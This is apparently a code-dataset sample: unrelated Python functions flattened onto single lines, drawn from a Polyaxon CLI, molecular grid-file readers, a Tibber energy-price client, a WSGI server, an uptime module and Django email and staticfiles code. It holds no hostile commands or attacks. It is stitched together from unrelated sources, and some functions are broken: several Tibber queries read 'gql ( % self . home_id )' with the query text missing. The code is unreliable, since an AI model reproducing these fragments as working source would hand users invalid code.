def version ( cli , platform ) : version_client = PolyaxonClient ( ) . version cli = cli or not any ( [ cli , platform ] ) if cli : try : server_version = version_client . get_cli_version ( ) except AuthorizationError : session_expired ( ) sys . exit ( 1 ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not get cli version.' ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) cli_version = get_version ( PROJECT_CLI_NAME ) Printer . print_header ( 'Current cli version: {}.' . format ( cli_version ) ) Printer . print_header ( 'Supported cli versions:' ) dict_tabulate ( server_version . to_dict ( ) ) if platform : try : platform_version = version_client . get_platform_version ( ) except AuthorizationError : session_expired ( ) sys . exit ( 1 ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not get platform version.' ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) chart_version = version_client . get_chart_version ( ) Printer . print_header ( 'Current platform version: {}.' . format ( chart_version . version ) ) Printer . print_header ( 'Supported platform versions:' ) dict_tabulate ( platform_version . to_dict ( ) )
def dashboard ( yes , url ) : dashboard_url = "{}/app" . format ( PolyaxonClient ( ) . api_config . http_host ) if url : click . echo ( dashboard_url ) sys . exit ( 0 ) if not yes : click . confirm ( 'Dashboard page will now open in your browser. Continue?' , abort = True , default = True ) click . launch ( dashboard_url )
def check ( self ) : if not self . is_valid : raise PolyaxonDeploymentConfigError ( 'Deployment type `{}` not supported' . format ( self . deployment_type ) ) check = False if self . is_kubernetes : check = self . check_for_kubernetes ( ) elif self . is_docker_compose : check = self . check_for_docker_compose ( ) elif self . is_docker : check = self . check_for_docker ( ) elif self . is_heroku : check = self . check_for_heroku ( ) if not check : raise PolyaxonDeploymentConfigError ( 'Deployment `{}` is not valid' . format ( self . deployment_type ) )
def install ( self ) : if not self . is_valid : raise PolyaxonDeploymentConfigError ( 'Deployment type `{}` not supported' . format ( self . deployment_type ) ) if self . is_kubernetes : self . install_on_kubernetes ( ) elif self . is_docker_compose : self . install_on_docker_compose ( ) elif self . is_docker : self . install_on_docker ( ) elif self . is_heroku : self . install_on_heroku ( )
def project ( ctx , project ) : # pylint:disable=redefined-outer-name if ctx . invoked_subcommand not in [ 'create' , 'list' ] : ctx . obj = ctx . obj or { } ctx . obj [ 'project' ] = project
def download ( ctx ) : user , project_name = get_project_or_local ( ctx . obj . get ( 'project' ) ) try : PolyaxonClient ( ) . project . download_repo ( user , project_name ) except ( PolyaxonHTTPError , PolyaxonShouldExitError , PolyaxonClientException ) as e : Printer . print_error ( 'Could not download code for project `{}`.' . format ( project_name ) ) Printer . print_error ( 'Error message `{}`.' . format ( e ) ) sys . exit ( 1 ) Printer . print_success ( 'Files downloaded.' )
def write ( self , file , optstring = "" , quote = False ) : classid = str ( self . id ) if quote : classid = '"' + classid + '"' # Only use a *single* space between tokens; both chimera's and pymol's DX parser # does not properly implement the OpenDX specs and produces garbage with multiple # spaces. (Chimera 1.4.1, PyMOL 1.3) file . write ( 'object ' + classid + ' class ' + str ( self . name ) + ' ' + optstring + '\n' )
def value ( self , ascode = None ) : if ascode is None : ascode = self . code return self . cast [ ascode ] ( self . text )
def use_parser ( self , parsername ) : self . __parser = self . parsers [ parsername ] self . __parser ( )
def read ( self , filename ) : from struct import calcsize , unpack if not filename is None : self . filename = filename with open ( self . filename , 'rb' ) as plt : h = self . header = self . _read_header ( plt ) nentries = h [ 'nx' ] * h [ 'ny' ] * h [ 'nz' ] # quick and dirty... slurp it all in one go datafmt = h [ 'bsaflag' ] + str ( nentries ) + self . _data_bintype a = numpy . array ( unpack ( datafmt , plt . read ( calcsize ( datafmt ) ) ) ) self . header [ 'filename' ] = self . filename self . array = a . reshape ( h [ 'nz' ] , h [ 'ny' ] , h [ 'nx' ] ) . transpose ( ) # unpack plt in reverse!! self . delta = self . _delta ( ) self . origin = numpy . array ( [ h [ 'xmin' ] , h [ 'ymin' ] , h [ 'zmin' ] ] ) + 0.5 * numpy . diagonal ( self . delta ) self . rank = h [ 'rank' ]
def _load_cpp4 ( self , filename ) : ccp4 = CCP4 . CCP4 ( ) ccp4 . read ( filename ) grid , edges = ccp4 . histogramdd ( ) self . __init__ ( grid = grid , edges = edges , metadata = self . metadata )
def _load_dx ( self , filename ) : dx = OpenDX . field ( 0 ) dx . read ( filename ) grid , edges = dx . histogramdd ( ) self . __init__ ( grid = grid , edges = edges , metadata = self . metadata )
def _load_plt ( self , filename ) : g = gOpenMol . Plt ( ) g . read ( filename ) grid , edges = g . histogramdd ( ) self . __init__ ( grid = grid , edges = edges , metadata = self . metadata )
def read ( self , filename ) : if filename is not None : self . filename = filename with open ( self . filename , 'rb' ) as ccp4 : h = self . header = self . _read_header ( ccp4 ) nentries = h [ 'nc' ] * h [ 'nr' ] * h [ 'ns' ] # Quick and dirty... slurp it all in one go. datafmt = h [ 'bsaflag' ] + str ( nentries ) + self . _data_bintype a = np . array ( struct . unpack ( datafmt , ccp4 . read ( struct . calcsize ( datafmt ) ) ) ) self . header [ 'filename' ] = self . filename # TODO: Account for the possibility that y-axis is fastest or # slowest index, which unfortunately is possible in CCP4. order = 'C' if h [ 'mapc' ] == 'z' else 'F' self . array = a . reshape ( h [ 'nc' ] , h [ 'nr' ] , h [ 'ns' ] , order = order ) self . delta = self . _delta ( ) self . origin = np . zeros ( 3 ) self . rank = 3
async def rt_connect ( self , loop ) : if self . sub_manager is not None : return self . sub_manager = SubscriptionManager ( loop , "token={}" . format ( self . _access_token ) , SUB_ENDPOINT ) self . sub_manager . start ( )
def sync_update_info ( self , * _ ) : loop = asyncio . get_event_loop ( ) task = loop . create_task ( self . update_info ( ) ) loop . run_until_complete ( task )
async def update_info ( self , * _ ) : query = gql ( ) res = await self . _execute ( query ) if res is None : return errors = res . get ( "errors" , [ ] ) if errors : msg = errors [ 0 ] . get ( "message" , "failed to login" ) _LOGGER . error ( msg ) raise InvalidLogin ( msg ) data = res . get ( "data" ) if not data : return viewer = data . get ( "viewer" ) if not viewer : return self . _name = viewer . get ( "name" ) homes = viewer . get ( "homes" , [ ] ) self . _home_ids = [ ] for _home in homes : home_id = _home . get ( "id" ) self . _all_home_ids += [ home_id ] subs = _home . get ( "subscriptions" ) if subs : status = subs [ 0 ] . get ( "status" , "ended" ) . lower ( ) if not home_id or status != "running" : continue self . _home_ids += [ home_id ]
def get_homes ( self , only_active = True ) : return [ self . get_home ( home_id ) for home_id in self . get_home_ids ( only_active ) ]
def get_home ( self , home_id ) : if home_id not in self . _all_home_ids : _LOGGER . error ( "Could not find any Tibber home with id: %s" , home_id ) return None if home_id not in self . _homes . keys ( ) : self . _homes [ home_id ] = TibberHome ( home_id , self ) return self . _homes [ home_id ]
async def update_info ( self ) : query = gql ( % self . _home_id ) self . info = await self . _tibber_control . execute ( query )
def sync_update_current_price_info ( self ) : loop = asyncio . get_event_loop ( ) task = loop . create_task ( self . update_current_price_info ( ) ) loop . run_until_complete ( task )
async def update_current_price_info ( self ) : query = gql ( % self . home_id ) price_info_temp = await self . _tibber_control . execute ( query ) if not price_info_temp : _LOGGER . error ( "Could not find current price info." ) return try : home = price_info_temp [ "viewer" ] [ "home" ] current_subscription = home [ "currentSubscription" ] price_info = current_subscription [ "priceInfo" ] [ "current" ] except ( KeyError , TypeError ) : _LOGGER . error ( "Could not find current price info." ) return if price_info : self . _current_price_info = price_info
def sync_update_price_info ( self ) : loop = asyncio . get_event_loop ( ) task = loop . create_task ( self . update_price_info ( ) ) loop . run_until_complete ( task )
async def update_price_info ( self ) : query = gql ( % self . home_id ) price_info_temp = await self . _tibber_control . execute ( query ) if not price_info_temp : _LOGGER . error ( "Could not find price info." ) return self . _price_info = { } self . _level_info = { } for key in [ "current" , "today" , "tomorrow" ] : try : home = price_info_temp [ "viewer" ] [ "home" ] current_subscription = home [ "currentSubscription" ] price_info = current_subscription [ "priceInfo" ] [ key ] except ( KeyError , TypeError ) : _LOGGER . error ( "Could not find price info for %s." , key ) continue if key == "current" : self . _current_price_info = price_info continue for data in price_info : self . _price_info [ data . get ( "startsAt" ) ] = data . get ( "total" ) self . _level_info [ data . get ( "startsAt" ) ] = data . get ( "level" )
def currency ( self ) : try : current_subscription = self . info [ "viewer" ] [ "home" ] [ "currentSubscription" ] return current_subscription [ "priceInfo" ] [ "current" ] [ "currency" ] except ( KeyError , TypeError , IndexError ) : _LOGGER . error ( "Could not find currency." ) return ""
def price_unit ( self ) : currency = self . currency consumption_unit = self . consumption_unit if not currency or not consumption_unit : _LOGGER . error ( "Could not find price_unit." ) return " " return currency + "/" + consumption_unit
async def rt_subscribe ( self , loop , async_callback ) : if self . _subscription_id is not None : _LOGGER . error ( "Already subscribed." ) return await self . _tibber_control . rt_connect ( loop ) document = gql ( % self . home_id ) sub_query = print_ast ( document ) self . _subscription_id = await self . _tibber_control . sub_manager . subscribe ( sub_query , async_callback )
async def rt_unsubscribe ( self ) : if self . _subscription_id is None : _LOGGER . error ( "Not subscribed." ) return await self . _tibber_control . sub_manager . unsubscribe ( self . _subscription_id )
def rt_subscription_running ( self ) : return ( self . _tibber_control . sub_manager is not None and self . _tibber_control . sub_manager . is_running and self . _subscription_id is not None )
async def get_historic_data ( self , n_data ) : query = gql ( % ( self . home_id , n_data ) ) data = await self . _tibber_control . execute ( query ) if not data : _LOGGER . error ( "Could not find current the data." ) return data = data [ "viewer" ] [ "home" ] [ "consumption" ] if data is None : self . _data = [ ] return self . _data = data [ "nodes" ]
def cleanup_none ( self ) : for ( prop , default ) in self . defaults . items ( ) : if getattr ( self , prop ) == '_None' : setattr ( self , prop , None )
def build_environ ( self , sock_file , conn ) : # Grab the request line request = self . read_request_line ( sock_file ) # Copy the Base Environment environ = self . base_environ . copy ( ) # Grab the headers for k , v in self . read_headers ( sock_file ) . items ( ) : environ [ str ( 'HTTP_' + k ) ] = v # Add CGI Variables environ [ 'REQUEST_METHOD' ] = request [ 'method' ] environ [ 'PATH_INFO' ] = request [ 'path' ] environ [ 'SERVER_PROTOCOL' ] = request [ 'protocol' ] environ [ 'SERVER_PORT' ] = str ( conn . server_port ) environ [ 'REMOTE_PORT' ] = str ( conn . client_port ) environ [ 'REMOTE_ADDR' ] = str ( conn . client_addr ) environ [ 'QUERY_STRING' ] = request [ 'query_string' ] if 'HTTP_CONTENT_LENGTH' in environ : environ [ 'CONTENT_LENGTH' ] = environ [ 'HTTP_CONTENT_LENGTH' ] if 'HTTP_CONTENT_TYPE' in environ : environ [ 'CONTENT_TYPE' ] = environ [ 'HTTP_CONTENT_TYPE' ] # Save the request method for later self . request_method = environ [ 'REQUEST_METHOD' ] # Add Dynamic WSGI Variables if conn . ssl : environ [ 'wsgi.url_scheme' ] = 'https' environ [ 'HTTPS' ] = 'on' else : environ [ 'wsgi.url_scheme' ] = 'http' if environ . get ( 'HTTP_TRANSFER_ENCODING' , '' ) == 'chunked' : environ [ 'wsgi.input' ] = ChunkedReader ( sock_file ) else : environ [ 'wsgi.input' ] = sock_file return environ
def write ( self , data , sections = None ) : if self . error [ 0 ] : self . status = self . error [ 0 ] data = b ( self . error [ 1 ] ) if not self . headers_sent : self . send_headers ( data , sections ) if self . request_method != 'HEAD' : try : if self . chunked : self . conn . sendall ( b ( '%x\r\n%s\r\n' % ( len ( data ) , data ) ) ) else : self . conn . sendall ( data ) except socket . timeout : self . closeConnection = True except socket . error : # But some clients will close the connection before that # resulting in a socket error. self . closeConnection = True
def CherryPyWSGIServer ( bind_addr , wsgi_app , numthreads = 10 , server_name = None , max = - 1 , request_queue_size = 5 , timeout = 10 , shutdown_timeout = 5 ) : max_threads = max if max_threads < 0 : max_threads = 0 return Rocket ( bind_addr , 'wsgi' , { 'wsgi_app' : wsgi_app } , min_threads = numthreads , max_threads = max_threads , queue_size = request_queue_size , timeout = timeout )
def _ordinal_metric ( _v1 , _v2 , i1 , i2 , n_v ) : if i1 > i2 : i1 , i2 = i2 , i1 return ( np . sum ( n_v [ i1 : ( i2 + 1 ) ] ) - ( n_v [ i1 ] + n_v [ i2 ] ) / 2 ) ** 2
def _ratio_metric ( v1 , v2 , * * _kwargs ) : return ( ( ( v1 - v2 ) / ( v1 + v2 ) ) ** 2 ) if v1 + v2 != 0 else 0
def _process_return_multi_z ( self , data , names , dim_sizes ) : # process data d1 = 0 d2 = 0 for name , dim_size in zip ( names , dim_sizes ) : d2 = d1 + dim_size if dim_size == 1 : self . data [ name . rstrip ( ) ] = data [ d1 , : ] else : self . data [ name . rstrip ( ) ] = data [ d1 : d2 , : ] d1 += dim_size
def _read_all_attribute_info ( self ) : num = copy . deepcopy ( self . _num_attrs ) fname = copy . deepcopy ( self . fname ) out = fortran_cdf . inquire_all_attr ( fname , num , len ( fname ) ) status = out [ 0 ] names = out [ 1 ] . astype ( 'U' ) scopes = out [ 2 ] max_gentries = out [ 3 ] max_rentries = out [ 4 ] max_zentries = out [ 5 ] attr_nums = out [ 6 ] global_attrs_info = { } var_attrs_info = { } if status == 0 : for name , scope , gentry , rentry , zentry , num in zip ( names , scopes , max_gentries , max_rentries , max_zentries , attr_nums ) : name = '' . join ( name ) name = name . rstrip ( ) nug = { } nug [ 'scope' ] = scope nug [ 'max_gentry' ] = gentry nug [ 'max_rentry' ] = rentry nug [ 'max_zentry' ] = zentry nug [ 'attr_num' ] = num flag = ( gentry == 0 ) & ( rentry == 0 ) & ( zentry == 0 ) if not flag : if scope == 1 : global_attrs_info [ name ] = nug elif scope == 2 : var_attrs_info [ name ] = nug self . global_attrs_info = global_attrs_info self . var_attrs_info = var_attrs_info else : raise IOError ( fortran_cdf . statusreporter ( status ) )
def _read_all_z_attribute_data ( self ) : self . meta = { } # collect attribute info needed to get more info from  # fortran routines max_entries = [ ] attr_nums = [ ] names = [ ] attr_names = [ ] names = self . var_attrs_info . keys ( ) num_z_attrs = len ( names ) exp_attr_nums = [ ] for key in names : max_entries . append ( self . var_attrs_info [ key ] [ 'max_zentry' ] ) attr_nums . append ( self . var_attrs_info [ key ] [ 'attr_num' ] ) attr_nums = np . array ( attr_nums ) max_entries = np . array ( max_entries ) info = fortran_cdf . z_attr_all_inquire ( self . fname , attr_nums , num_z_attrs , max_entries , self . _num_z_vars , len ( self . fname ) ) status = info [ 0 ] data_types = info [ 1 ] num_elems = info [ 2 ] entry_nums = info [ 3 ] if status == 0 : for i , name in enumerate ( names ) : self . var_attrs_info [ name ] [ 'data_type' ] = data_types [ i ] self . var_attrs_info [ name ] [ 'num_elems' ] = num_elems [ i ] self . var_attrs_info [ name ] [ 'entry_num' ] = entry_nums [ i ] exp_attr_nums . extend ( [ self . var_attrs_info [ name ] [ 'attr_num' ] ] * len ( entry_nums [ i ] ) ) attr_names . extend ( [ name ] * len ( entry_nums [ i ] ) ) else : raise IOError ( fortran_cdf . statusreporter ( status ) ) # all the info is now packed up # need to break it out to make it easier to load via fortran # all of this junk # attribute  id, entry id (zVariable ID), data_type, num_elems # should just need to flatten this stuff data_types = data_types . flatten ( ) num_elems = num_elems . flatten ( ) entry_nums = entry_nums . flatten ( ) attr_nums = np . array ( exp_attr_nums ) # drop everything that isn't valid idx , = np . where ( entry_nums > 0 ) data_types = data_types [ idx ] num_elems = num_elems [ idx ] entry_nums = entry_nums [ idx ] attr_nums = attr_nums [ idx ] attr_names = np . array ( attr_names ) [ idx ] # grad corresponding variable name for each attribute var_names = [ self . z_variable_names_by_num [ i ] . rstrip ( ) for i in entry_nums ] # the names that go along with this are already set up # in attr_names # chunk by data type, grab largest num_elems # get data back, shorten to num_elems, add to structure self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'real4' ] , fortran_cdf . get_multi_z_attr_real4 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'float' ] , fortran_cdf . get_multi_z_attr_real4 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'real8' ] , fortran_cdf . get_multi_z_attr_real8 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'double' ] , fortran_cdf . get_multi_z_attr_real8 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'byte' ] , fortran_cdf . get_multi_z_attr_int1 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'int1' ] , fortran_cdf . get_multi_z_attr_int1 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'uint1' ] , fortran_cdf . get_multi_z_attr_int1 , data_offset = 256 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'int2' ] , fortran_cdf . get_multi_z_attr_int2 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'uint2' ] , fortran_cdf . get_multi_z_attr_int2 , data_offset = 65536 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'int4' ] , fortran_cdf . get_multi_z_attr_int4 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'uint4' ] , fortran_cdf . get_multi_z_attr_int4 , data_offset = 2 ** 32 ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'char' ] , fortran_cdf . get_multi_z_attr_char ) self . _call_multi_fortran_z_attr ( attr_names , data_types , num_elems , entry_nums , attr_nums , var_names , self . cdf_data_types [ 'uchar' ] , fortran_cdf . get_multi_z_attr_char )
def _process_return_multi_z_attr ( self , data , attr_names , var_names , sub_num_elems ) : # process data for i , ( attr_name , var_name , num_e ) in enumerate ( zip ( attr_names , var_names , sub_num_elems ) ) : if var_name not in self . meta . keys ( ) : self . meta [ var_name ] = { } if num_e == 1 : self . meta [ var_name ] [ attr_name ] = data [ i , 0 ] else : if data [ i ] . dtype == '|S1' : self . meta [ var_name ] [ attr_name ] = '' . join ( data [ i , 0 : num_e ] . astype ( 'U' ) ) . rstrip ( ) else : self . meta [ var_name ] [ attr_name ] = data [ i , 0 : num_e ]
def _uptime_linux ( ) : # With procfs try : f = open ( '/proc/uptime' , 'r' ) up = float ( f . readline ( ) . split ( ) [ 0 ] ) f . close ( ) return up except ( IOError , ValueError ) : pass # Without procfs (really?) try : libc = ctypes . CDLL ( 'libc.so' ) except AttributeError : return None except OSError : # Debian and derivatives do the wrong thing because /usr/lib/libc.so # is a GNU ld script rather than an ELF object. To get around this, we # have to be more specific. # We don't want to use ctypes.util.find_library because that creates a # new process on Linux. We also don't want to try too hard because at # this point we're already pretty sure this isn't Linux. try : libc = ctypes . CDLL ( 'libc.so.6' ) except OSError : return None if not hasattr ( libc , 'sysinfo' ) : # Not Linux. return None buf = ctypes . create_string_buffer ( 128 ) # 64 suffices on 32-bit, whatever. if libc . sysinfo ( buf ) < 0 : return None up = struct . unpack_from ( '@l' , buf . raw ) [ 0 ] if up < 0 : up = None return up
def _boottime_linux ( ) : global __boottime try : f = open ( '/proc/stat' , 'r' ) for line in f : if line . startswith ( 'btime' ) : __boottime = int ( line . split ( ) [ 1 ] ) if datetime is None : raise NotImplementedError ( 'datetime module required.' ) return datetime . fromtimestamp ( __boottime ) except ( IOError , IndexError ) : return None
def _uptime_amiga ( ) : global __boottime try : __boottime = os . stat ( 'RAM:' ) . st_ctime return time . time ( ) - __boottime except ( NameError , OSError ) : return None
def _uptime_minix ( ) : try : f = open ( '/proc/uptime' , 'r' ) up = float ( f . read ( ) ) f . close ( ) return up except ( IOError , ValueError ) : return None
def _uptime_plan9 ( ) : # Apparently Plan 9 only has Python 2.2, which I'm not prepared to # support. Maybe some Linuxes implement /dev/time, though, someone was # talking about it somewhere. try : # The time file holds one 32-bit number representing the sec- # onds since start of epoch and three 64-bit numbers, repre- # senting nanoseconds since start of epoch, clock ticks, and # clock frequency. #  -- cons(3) f = open ( '/dev/time' , 'r' ) s , ns , ct , cf = f . read ( ) . split ( ) f . close ( ) return float ( ct ) / float ( cf ) except ( IOError , ValueError ) : return None
def _uptime_solaris ( ) : global __boottime try : kstat = ctypes . CDLL ( 'libkstat.so' ) except ( AttributeError , OSError ) : return None # kstat doesn't have uptime, but it does have boot time. # Unfortunately, getting at it isn't perfectly straightforward. # First, let's pretend to be kstat.h # Constant KSTAT_STRLEN = 31 # According to every kstat.h I could find. # Data structures class anon_union ( ctypes . Union ) : # The ``value'' union in kstat_named_t actually has a bunch more # members, but we're only using it for boot_time, so we only need # the padding and the one we're actually using. _fields_ = [ ( 'c' , ctypes . c_char * 16 ) , ( 'time' , ctypes . c_int ) ] class kstat_named_t ( ctypes . Structure ) : _fields_ = [ ( 'name' , ctypes . c_char * KSTAT_STRLEN ) , ( 'data_type' , ctypes . c_char ) , ( 'value' , anon_union ) ] # Function signatures kstat . kstat_open . restype = ctypes . c_void_p kstat . kstat_lookup . restype = ctypes . c_void_p kstat . kstat_lookup . argtypes = [ ctypes . c_void_p , ctypes . c_char_p , ctypes . c_int , ctypes . c_char_p ] kstat . kstat_read . restype = ctypes . c_int kstat . kstat_read . argtypes = [ ctypes . c_void_p , ctypes . c_void_p , ctypes . c_void_p ] kstat . kstat_data_lookup . restype = ctypes . POINTER ( kstat_named_t ) kstat . kstat_data_lookup . argtypes = [ ctypes . c_void_p , ctypes . c_char_p ] # Now, let's do something useful. # Initialise kstat control structure. kc = kstat . kstat_open ( ) if not kc : return None # We're looking for unix:0:system_misc:boot_time. ksp = kstat . kstat_lookup ( kc , 'unix' , 0 , 'system_misc' ) if ksp and kstat . kstat_read ( kc , ksp , None ) != - 1 : data = kstat . kstat_data_lookup ( ksp , 'boot_time' ) if data : __boottime = data . contents . value . time # Clean-up. kstat . kstat_close ( kc ) if __boottime is not None : return time . time ( ) - __boottime return None
def _uptime_syllable ( ) : global __boottime try : __boottime = os . stat ( '/dev/pty/mst/pty0' ) . st_mtime return time . time ( ) - __boottime except ( NameError , OSError ) : return None
def uptime ( ) : if __boottime is not None : return time . time ( ) - __boottime return { 'amiga' : _uptime_amiga , 'aros12' : _uptime_amiga , 'beos5' : _uptime_beos , 'cygwin' : _uptime_linux , 'darwin' : _uptime_osx , 'haiku1' : _uptime_beos , 'linux' : _uptime_linux , 'linux-armv71' : _uptime_linux , 'linux2' : _uptime_linux , 'mac' : _uptime_mac , 'minix3' : _uptime_minix , 'riscos' : _uptime_riscos , 'sunos5' : _uptime_solaris , 'syllable' : _uptime_syllable , 'win32' : _uptime_windows , 'wince' : _uptime_windows } . get ( sys . platform , _uptime_bsd ) ( ) or _uptime_bsd ( ) or _uptime_plan9 ( ) or _uptime_linux ( ) or _uptime_windows ( ) or _uptime_solaris ( ) or _uptime_beos ( ) or _uptime_amiga ( ) or _uptime_riscos ( ) or _uptime_posix ( ) or _uptime_syllable ( ) or _uptime_mac ( ) or _uptime_osx ( )
def boottime ( ) : global __boottime if __boottime is None : up = uptime ( ) if up is None : return None if __boottime is None : _boottime_linux ( ) if datetime is None : raise RuntimeError ( 'datetime module required.' ) return datetime . fromtimestamp ( __boottime or time . time ( ) - up )
def _initfile ( path , data = "dict" ) : data = { } if data . lower ( ) == "dict" else [ ] # The file will need to be created if it doesn't exist if not os . path . exists ( path ) : # The file doesn't exist # Raise exception if the directory that should contain the file doesn't # exist dirname = os . path . dirname ( path ) if dirname and not os . path . exists ( dirname ) : raise IOError ( ( "Could not initialize empty JSON file in non-existant " "directory '{}'" ) . format ( os . path . dirname ( path ) ) ) # Write an empty file there with open ( path , "w" ) as f : json . dump ( data , f ) return True elif os . path . getsize ( path ) == 0 : # The file is empty with open ( path , "w" ) as f : json . dump ( data , f ) else : # The file exists and contains content return False
def is_configured ( self , project , * * kwargs ) : params = self . get_option return bool ( params ( 'server_host' , project ) and params ( 'server_port' , project ) )
def send_confirmation ( self ) : confirmation = EmailConfirmation . objects . create ( email = self ) confirmation . send ( )
def send_duplicate_notification ( self ) : email_utils . send_email ( from_email = settings . DEFAULT_FROM_EMAIL , recipient_list = [ self . email ] , subject = _ ( "Registration Attempt" ) , template_name = "rest_email_auth/emails/duplicate-email" , ) logger . info ( "Sent duplicate email notification to: %s" , self . email )
def set_primary ( self ) : query = EmailAddress . objects . filter ( is_primary = True , user = self . user ) query = query . exclude ( pk = self . pk ) # The transaction is atomic so there is never a gap where a user # has no primary email address. with transaction . atomic ( ) : query . update ( is_primary = False ) self . is_primary = True self . save ( ) logger . info ( "Set %s as the primary email address for %s." , self . email , self . user , )
def confirm ( self ) : self . email . is_verified = True self . email . save ( ) signals . email_verified . send ( email = self . email , sender = self . __class__ ) logger . info ( "Verified email address: %s" , self . email . email )
def send ( self ) : context = { "verification_url" : app_settings . EMAIL_VERIFICATION_URL . format ( key = self . key ) } email_utils . send_email ( context = context , from_email = settings . DEFAULT_FROM_EMAIL , recipient_list = [ self . email . email ] , subject = _ ( "Please Verify Your Email Address" ) , template_name = "rest_email_auth/emails/verify-email" , ) logger . info ( "Sent confirmation email to %s for user #%d" , self . email . email , self . email . user . id , )
def save ( self ) : token = models . PasswordResetToken . objects . get ( key = self . validated_data [ "key" ] ) token . email . user . set_password ( self . validated_data [ "password" ] ) token . email . user . save ( ) logger . info ( "Reset password for %s" , token . email . user ) token . delete ( )
def create ( self , * args , * * kwargs ) : is_primary = kwargs . pop ( "is_primary" , False ) with transaction . atomic ( ) : email = super ( EmailAddressManager , self ) . create ( * args , * * kwargs ) if is_primary : email . set_primary ( ) return email
def get_queryset ( self ) : oldest = timezone . now ( ) - app_settings . PASSWORD_RESET_EXPIRATION queryset = super ( ValidPasswordResetTokenManager , self ) . get_queryset ( ) return queryset . filter ( created_at__gt = oldest )
def handle ( self , * args , * * kwargs ) : cutoff = timezone . now ( ) cutoff -= app_settings . CONFIRMATION_EXPIRATION cutoff -= app_settings . CONFIRMATION_SAVE_PERIOD queryset = models . EmailConfirmation . objects . filter ( created_at__lte = cutoff ) count = queryset . count ( ) queryset . delete ( ) if count : self . stdout . write ( self . style . SUCCESS ( "Removed {count} old email confirmation(s)" . format ( count = count ) ) ) else : self . stdout . write ( "No email confirmations to remove." )
def get_repr ( self , obj , referent = None ) : objtype = type ( obj ) typename = str ( objtype . __module__ ) + "." + objtype . __name__ prettytype = typename . replace ( "__builtin__." , "" ) name = getattr ( obj , "__name__" , "" ) if name : prettytype = "%s %r" % ( prettytype , name ) key = "" if referent : key = self . get_refkey ( obj , referent ) url = reverse ( 'dowser_trace_object' , args = ( typename , id ( obj ) ) ) return ( '<a class="objectid" href="%s">%s</a> ' '<span class="typename">%s</span>%s<br />' '<span class="repr">%s</span>' % ( url , id ( obj ) , prettytype , key , get_repr ( obj , 100 ) ) )
def walk ( self , maxresults = 100 , maxdepth = None ) : log . debug ( "step" ) self . seen = { } self . ignore ( self , self . __dict__ , self . obj , self . seen , self . _ignore ) # Ignore the calling frame, its builtins, globals and locals self . ignore_caller ( ) self . maxdepth = maxdepth count = 0 log . debug ( "will iterate results" ) for result in self . _gen ( self . obj ) : log . debug ( "will yeld" ) yield result count += 1 if maxresults and count >= maxresults : yield 0 , 0 , "==== Max results reached ====" return
def print_tree ( self , maxresults = 100 , maxdepth = None ) : self . ignore_caller ( ) for depth , refid , rep in self . walk ( maxresults , maxdepth ) : print ( ( "%9d" % refid ) , ( " " * depth * 2 ) , rep )
def print_tree ( self , maxresults = 100 , maxdepth = None ) : self . ignore_caller ( ) for trail in self . walk ( maxresults , maxdepth ) : print ( trail ) if self . stops : print ( "%s paths stopped because max depth reached" % self . stops )
def list ( self , ignore_patterns ) : for prefix , root in self . locations : storage = self . storages [ root ] for path in utils . get_files ( storage , ignore_patterns ) : yield path , storage
def list ( self , ignore_patterns ) : for storage in six . itervalues ( self . storages ) : if storage . exists ( '' ) : # check if storage location exists for path in utils . get_files ( storage , ignore_patterns ) : yield path , storage
def find ( self , path , all = False ) : matches = [ ] for app in self . apps : app_location = self . storages [ app ] . location if app_location not in searched_locations : searched_locations . append ( app_location ) match = self . find_in_app ( app , path ) if match : if not all : return match matches . append ( match ) return matches
def find_in_app ( self , app , path ) : storage = self . storages . get ( app , None ) if storage : # only try to find a file if the source dir actually exists if storage . exists ( path ) : matched_path = storage . path ( path ) if matched_path : return matched_path
def set_options ( self , * * options ) : self . interactive = options [ 'interactive' ] self . verbosity = options [ 'verbosity' ] self . symlink = options [ 'link' ] self . clear = options [ 'clear' ] self . dry_run = options [ 'dry_run' ] ignore_patterns = options [ 'ignore_patterns' ] if options [ 'use_default_ignore_patterns' ] : ignore_patterns += [ 'CVS' , '.*' , '*~' ] self . ignore_patterns = list ( set ( ignore_patterns ) ) self . post_process = options [ 'post_process' ]
def clear_dir ( self , path ) : dirs , files = self . storage . listdir ( path ) for f in files : fpath = os . path . join ( path , f ) if self . dry_run : self . log ( "Pretending to delete '%s'" % smart_text ( fpath ) , level = 1 ) else : self . log ( "Deleting '%s'" % smart_text ( fpath ) , level = 1 ) self . storage . delete ( fpath ) for d in dirs : self . clear_dir ( os . path . join ( path , d ) )
